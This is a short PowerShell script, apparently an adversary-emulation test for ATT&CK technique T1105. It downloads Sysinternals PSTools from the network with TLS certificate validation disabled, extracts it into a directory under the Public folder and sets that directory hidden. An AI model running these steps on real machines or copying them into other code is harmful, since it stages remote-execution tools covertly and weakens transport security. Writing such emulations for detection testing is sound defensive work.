# Download and install PSTools
# Technic ID : T1105
Clear-Host
Write-Output "==============================================================================="
Write-Output "Download and installs PSTools (T1105)"
Write-Output "==============================================================================="
#
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
$web = (New-Object System.Net.WebClient);
$result = $web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", "PSTools.zip");
New-Item -ItemType "directory" $env:PUBLIC\PSTools -Force;
$psdir=Get-Item "$env:PUBLIC\PSTools" -Force;
$psdir.attributes="hidden";
Add-Type -Assembly ''System.IO.Compression.FileSystem''; [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", "$env:PUBLIC\PSTools");